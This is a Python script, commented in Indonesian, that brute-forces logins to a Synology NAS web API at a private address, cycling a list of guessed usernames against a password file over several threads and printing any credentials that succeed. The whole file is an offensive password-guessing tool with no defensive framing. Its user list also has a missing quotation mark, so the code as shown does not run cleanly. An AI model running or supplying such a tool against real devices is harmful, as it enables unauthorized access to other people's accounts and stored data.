import requests
import threading
import queue

# Konfigurasi target
synology_host = "http://10.9.118.221:5000"  # Ganti dengan alamat NAS
session_name = "FileStation"
wordlist_users = ["admin", "user", "guest", "NasAdmin", "nasAdmin", "adminRC", "manager, "teamTL1", "teamTL2", "teamTL3", "TL1", "TL2", "TL3"]  # Daftar username
password_file = "lpass.txt"  # File yang berisi daftar password

# Konfigurasi thread
THREADS = 5  # Jumlah thread yang digunakan
timeout = 5  # Timeout request (deteksi IP ban)
valid_credentials = None  # Menyimpan hasil brute-force

# Antrian kombinasi username & password
queue_list = queue.Queue()

# Memuat password dari file
try:
    with open(password_file, "r", encoding="utf-8") as f:
        wordlist_passwords = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print(f"[!] File {password_file} tidak ditemukan.")
    exit()

# Mengisi antrian dengan kombinasi username & password
for user in wordlist_users:
    for passwd in wordlist_passwords:
        queue_list.put((user, passwd))

# Fungsi untuk mencoba login ke Synology NAS
def brute_force():
    global valid_credentials
    while not queue_list.empty() and valid_credentials is None:
        username, password = queue_list.get()
        login_url = f"{synology_host}/webapi/auth.cgi"
        params = {
            "api": "SYNO.API.Auth",
            "version": "6",
            "method": "login",
            "account": username,
            "passwd": password,
            "session": session_name,
            "format": "cookie"
        }
        try:
            response = requests.get(login_url, params=params, timeout=timeout)
            if response.status_code == 200:
                data = response.json()
                if data.get("success"):
                    valid_credentials = (username, password)
                    print(f"[+] Berhasil login! Username: {username} | Password: {password}")
                    return
                else:
                    print(f"[-] Gagal login: {username} | {password}")
        except requests.RequestException:
            print(f"[!] Timeout atau error koneksi untuk: {username}")

# Memulai brute-force dengan multithreading
threads = []
for _ in range(THREADS):
    t = threading.Thread(target=brute_force)
    t.start()
    threads.append(t)

# Menunggu semua thread selesai
for t in threads:
    t.join()

if valid_credentials:
    print(f"\n[✅] Kredensial ditemukan: {valid_credentials[0]} | {valid_credentials[1]}")
else:
    print("\n[❌] Tidak ada kombinasi yang berhasil.")
